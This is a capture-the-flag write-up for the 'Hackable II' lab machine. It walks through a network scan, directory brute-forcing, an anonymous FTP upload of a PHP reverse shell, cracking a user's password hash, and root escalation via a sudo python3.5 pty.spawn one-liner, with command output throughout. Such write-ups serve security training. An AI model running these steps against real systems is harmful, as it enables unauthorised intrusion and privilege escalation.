# Hackable II Writeup

# Description
```bash
difficulty: easy

This works better with VirtualBox rather than VMware
```
# Exploitation
Let's start with a network scan 
```bash
 Currently scanning: 192.168.0.111/24   |   Screen View: Unique Hosts                                                                                                                                             
                                                                                                                                                                                                                  
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.104   40:65:d4:5e:e0:3e      1      60  Unknown vendor                                                                                                                                                 
 192.168.0.110   08:00:27:d0:8c:f4      1      60  PCS Systemtechnik GmbH
```
\
Next, Open Ports
```bash
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```
\
We access port 80 on browser , and it is just apache default installation page
I run dirb on it
```bash
dirb http://192.168.0.110/           

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Feb 19 00:30:30 2026
URL_BASE: http://192.168.0.110/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.0.110/ ----
==> DIRECTORY: http://192.168.0.110/files/                                                                                                                                                                        
+ http://192.168.0.110/index.html (CODE:200|SIZE:11239)                                                                                                                                                           
+ http://192.168.0.110/server-status (CODE:403|SIZE:278)                                                                                                                                                          
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.110/files/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Thu Feb 19 00:30:33 2026
DOWNLOADED: 4612 - FOUND: 2
```
\
We see /files , there was only 1 file call.html
\
<img width="629" height="282" alt="image" src="https://github.com/user-attachments/assets/e862432d-4702-4b84-92bb-bc64853b411c" />
\
So i just move on to ftp service 
```bash
ftp 192.168.0.110                                                                                                                           
Connected to 192.168.0.110.
220 ProFTPD Server (ProFTPD Default Installation) [192.168.0.110]
Name (192.168.0.110:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||42808|)
150 Opening ASCII mode data connection for file list
drwxr-xrwx   2 33       33           4096 Nov 26  2020 .
drwxr-xrwx   2 33       33           4096 Nov 26  2020 ..
-rw-r--r--   1 0        0             109 Nov 26  2020 CALL.html
226 Transfer complete
ftp> put rev.php
local: rev.php remote: rev.php
229 Entering Extended Passive Mode (|||35329|)
150 Opening BINARY mode data connection for rev.php
100% |**********************************************************************************************************************************************************************|  2587       21.64 MiB/s    00:00 ETA
226 Transfer complete
2587 bytes sent in 00:00 (1.76 MiB/s)
ftp> 
```
\
Here after logging in as anonymous , i realize that we have permission to upload files into the directory and sice this directory had the same call.html as at /files in port 80 , we realize that we cna just upload a rev shell payload and execute it
```bash
penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.111
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from ubuntu~192.168.0.110-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/ubuntu~192.168.0.110-Linux-x86_64/2026_02_19-00_34_38-599.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@ubuntu:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
\
Then when i was enumerating the system , i check /home directory
```bash
www-data@ubuntu:/home$ ls -la
total 16
drwxr-xr-x  3 root  root  4096 Nov 26  2020 .
drwxr-xr-x 23 root  root  4096 Nov 26  2020 ..
-rw-r--r--  1 root  root    43 Nov 26  2020 important.txt
drwxr-xr-x  4 shrek shrek 4096 Jun 15  2021 shrek
www-data@ubuntu:/home$ cat important.txt 
run the script to see the data

/.runme.sh
www-data@ubuntu:/home$ strings /.runme.sh
#!/bin/bash
echo 'the secret key'
sleep 2
echo 'is'
sleep 2
echo 'trolled'
sleep 2
echo 'restarting computer in 3 seconds...'
sleep 1
echo 'restarting computer in 2 seconds...'
sleep 1
echo 'restarting computer in 1 seconds...'
sleep 1
echo '
    shrek:cf4c2232354952690368f1b3dfdfb24d'
```
\
It looks like a hash , so i check in this online db
\
<img width="1390" height="558" alt="image" src="https://github.com/user-attachments/assets/663459ce-1f7d-45af-96cc-e60582c2c190" />
\
So we have the password of user "shrek" now
```bash
shrek@ubuntu:~$ cat user.txt 
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXK0OkkkkO0KXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXOo:'.            .';lkXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXKo'                        .ckXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXx,                 ........      :OXXXXXXXXXXXXXXXXXXXXX 
XXXXXXXXXXXXXXXXXXk.                  .............    'kXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXK;                    ...............    '0XXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXX0.          .:lol;.    .....;oxkxo:.....    oXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXX0         .oNMMMMMMMO.  ...lXMMMMMMMWO;...    cXXXXXXXXXXXXXXX
XXXXXXXXXXXXXK.        lWMMMMMMMMMMW; ..xMMMMMMMMMMMMx....   lXXXXXXXXXXXXXX
XXXXXXXXXXXXX;        kMMMMMMMMMMMMMM..:MMMMMMMMMMMMMM0...    OXXXXXXXXXXXXX
XXXXXXXXXXXXO        oMMMMMXKXMMMMMMM:.kMMMMMMNKNMMMMMMo...   'XXXXXXXXXXXXX
XXXXXXXXXXXX,        WMMWl. :OK0MMMMMl.OMMMMo. ,OXXWMMMX...    XXXXXXXXXXXXX
XXXXXXXXXXXX        'MMM:   0MMocMMMM,.oMMMl   xMMO;MMMM...    kXXXXXXXXXXXX
XXXXXXXXXXX0        .MMM,    .. ;MMM0 ..NMM:    .. 'MMMW...    kXXXXXXXXXXXX
XXXXXXXXXXXO         XMMX'     ,NMMX  ..;WMN,     .XMMMO...    xXXXXXXXXXXXX
XXXXXXXXXXX0         .NMMMXkxkXMMMk   ...,0MMXkxkXMMMMN,...    dXXXXXXXXXXXX
XXXXXXXXXXXX          .xWMMMMMMWk.    .....c0MMMMMMMMk'....    dXXXXXXXXXXXX
XXXXXXXXXXXXl            ,colc'   .;::o:dc,..'codxdc''.....    dXXXXXXXXXXXX
XXXXXXXXXXXXX         .OOkxxdxxkOOOx ,d.:OOOOkxxxxkkOOd....    xXXXXXXXXXXXX
XXXXXXXXXXXXXd         oOOOOOOOOOOOOxOOOOOOOOOOOOOOOOO,....    OXXXXXXXXXXXX
XXXXXXXXXXXXXX.         cOOOOOOOOOOOOOOOOOOOOOOOOOOOx,.....    KXXXXXXXXXXXX
XXXXXXXXXXXXXXO          .xOOOOOOOOOOOOOOOOOOOOOOOkc.......    NXXXXXXXXXXXX
XXXXXXXXXXXXXXX;           ;kOOOOOOOOOOOOOOOOOOOkc.........   ,XXXXXXXXXXXXX
XXXXXXXXXXXXXXX0             ;kOOOOOOOOOOOOOOOd;...........   dXXXXXXXXXXXXX
XXXXXXXXXXXXXXXX.              ,dOOOOOOOOOOdc'.............   xXXXXXXXXXXXXX
XXXXXXXXXXXXXXXX.                 .''''..   ...............   .kXXXXXXXXXXXX
XXXXXXXXXXXXXXXK           .;okKNWWWWNKOd:.    ..............   'kXXXXXXXXXX
XXXXXXXXXXXXXXX'        .dXMMMMMMMMMMMMMMMMWO:    .............   'kXXXXXXXX
XXXXXXXXXXXXXK'       ,0MMMMMMMMMMMMMMMMMMMMMMWx.   ............    ,KXXXXXX
XXXXXXXXXXXKc       .0MMMMMMMMMMMMMMMMMMMMMMMMMMMk.   ............    xXXXXX
XXXXXXXXXXl        cWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo   .............   :XXXX
XXXXXXXXK.        dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0    ............   .KXX
XXXXXXXX.        'MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMO   .............   'XX

invite-me: https://www.linkedin.com/in/eliastouguinho/
```
\
Checking sudo privileges 
```bash
shrek@ubuntu:~$ sudo -l
Matching Defaults entries for shrek on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shrek may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3.5
```
\
So we can just become root by running this
```bash
sudo -u root /usr/bin/python3.5 -c "import pty;pty.spawn('/bin/bash')"
```
\
Getting root flag
```bash
root@ubuntu:/root# cat root.txt 
                            ____
        ____....----''''````    |.
,'''````            ____....----; '.
| __....----''''````         .-.`'. '.
|.-.                .....    | |   '. '.
`| |        ..:::::::::::::::| |   .-;. |
 | |`'-;-::::::::::::::::::::| |,,.| |-='
 | |   | ::::::::::::::::::::| |   | |
 | |   | :::::::::::::::;;;;;| |   | |
 | |   | :::::::::;;;2KY2KY2Y| |   | |
 | |   | :::::;;Y2KY2KY2KY2KY| |   | |
 | |   | :::;Y2Y2KY2KY2KY2KY2| |   | |
 | |   | :;Y2KY2KY2KY2KY2K+++| |   | |
 | |   | |;2KY2KY2KY2++++++++| |   | |
 | |   | | ;++++++++++++++++;| |   | |
 | |   | |  ;++++++++++++++;.| |   | |
 | |   | |   :++++++++++++:  | |   | |
 | |   | |    .:++++++++;.   | |   | |
 | |   | |       .:;+:..     | |   | |
 | |   | |         ;;        | |   | |
 | |   | |      .,:+;:,.     | |   | |
 | |   | |    .::::;+::::,   | |   | |
 | |   | |   ::::::;;::::::. | |   | |
 | |   | |  :::::::+;:::::::.| |   | |
 | |   | | ::::::::;;::::::::| |   | |
 | |   | |:::::::::+:::::::::| |   | |
 | |   | |:::::::::+:::::::::| |   | |
 | |   | ::::::::;+++;:::::::| |   | |
 | |   | :::::::;+++++;::::::| |   | |
 | |   | ::::::;+++++++;:::::| |   | |
 | |   |.:::::;+++++++++;::::| |   | |
 | | ,`':::::;+++++++++++;:::| |'"-| |-..
 | |'   ::::;+++++++++++++;::| |   '-' ,|
 | |    ::::;++++++++++++++;:| |     .' |
,;-'_   `-._===++++++++++_.-'| |   .'  .'
|    ````'''----....___-'    '-' .'  .'
'---....____           ````'''--;  ,'
            ````''''----....____|.'

invite-me: https://www.linkedin.com/in/eliastouguinho/
```
\
The end , thank you for reading till here
